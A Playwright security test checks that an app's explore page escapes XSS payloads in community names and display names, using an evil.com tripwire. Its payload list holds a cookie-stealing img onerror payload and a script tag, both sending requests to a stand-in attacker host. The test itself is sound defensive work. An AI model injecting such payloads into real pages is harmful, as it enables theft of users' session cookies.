/**
 * Codex Security Report - Section 3.4
 * Feature: Cross-Site Scripting (XSS) and Payload Neutralization
 *
 * @security @xss @gui-execution
 */

import type { Page } from '@playwright/test';
import { test, expect } from './fixtures/auth.fixture';
import { mockExploreEndpoints } from './helpers/mock-routes.js';
import { log } from './helpers/log.js';

const XSS_PAYLOADS = [
	'<img src=x onerror="fetch(\'http://evil.com/?cookie=\' + document.cookie)">',
	'<script>fetch("http://evil.com/?xss=1")</script>',
	'<svg onload="window.__xss_fired=true">',
];

async function setupExploreRoutes(
	page: Page,
	communityNames: string[],
): Promise<void> {
	await page.route('**/api/v2/servers', async (route) => {
		await route.fulfill({ status: 200, contentType: 'application/json', body: '[]' });
	});
	await page.route('**/api/v2/conversations', async (route) => {
		await route.fulfill({ status: 200, contentType: 'application/json', body: '[]' });
	});

	await mockExploreEndpoints(page, {
		communities: communityNames.map((name, index) => ({
			id: `xss-community-${index}`,
			name,
			memberCount: 1,
		})),
		searchUsers: [
			{
				id: 'xss-user-1',
				username: 'xss_test_user',
				displayName: XSS_PAYLOADS[0],
			},
		],
	});
}

test.describe('XSS payload neutralization @security @xss @gui-execution', () => {
	test('obfuscated script payloads in community names render as escaped text @smoke', async ({ userPage }) => {
		let xssFetchMade = false;
		await userPage.route('**evil.com**', async (route) => {
			xssFetchMade = true;
			log(
				'SECURITY',
				'XSS_TRIPWIRE',
				`ALERT - exfiltration request intercepted: ${route.request().url()}`,
			);
			await route.abort();
		});

		const consoleErrors: string[] = [];
		userPage.on('console', (message) => {
			if (message.type() === 'error') {
				consoleErrors.push(message.text());
			}
		});

		await setupExploreRoutes(userPage, XSS_PAYLOADS);
		await userPage.goto('/explore');
		await expect(userPage.locator('[aria-label="Loading Yapper"]')).toHaveCount(0, {
			timeout: 30_000,
		});

		await expect(userPage.locator('img[onerror]')).toHaveCount(0);
		await expect(userPage.locator('svg[onload]')).toHaveCount(0);

		const payloadFragment = 'img src=x onerror';
		const escapedTextLocator = userPage.locator(`text=<${payloadFragment}`);
		await expect(escapedTextLocator.first()).toBeVisible({ timeout: 5_000 });
		expect(await escapedTextLocator.count()).toBeGreaterThan(0);

		expect(xssFetchMade).toBe(false);
		const xssFired = await userPage.evaluate(
			() => (window as unknown as Record<string, unknown>).__xss_fired,
		);
		expect(xssFired).toBeFalsy();

		const xssErrors = consoleErrors.filter(
			(error) => error.includes('evil.com') || error.includes('onerror') || error.includes('__xss'),
		);
		expect(xssErrors).toHaveLength(0);
	});
});
